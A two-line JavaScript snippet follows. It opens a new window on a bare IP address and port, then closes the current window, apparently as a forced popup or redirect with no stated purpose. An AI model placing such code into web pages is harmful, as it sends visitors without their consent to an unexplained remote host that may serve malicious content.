window.open("http://49.232.13.120:1111/");
window.close();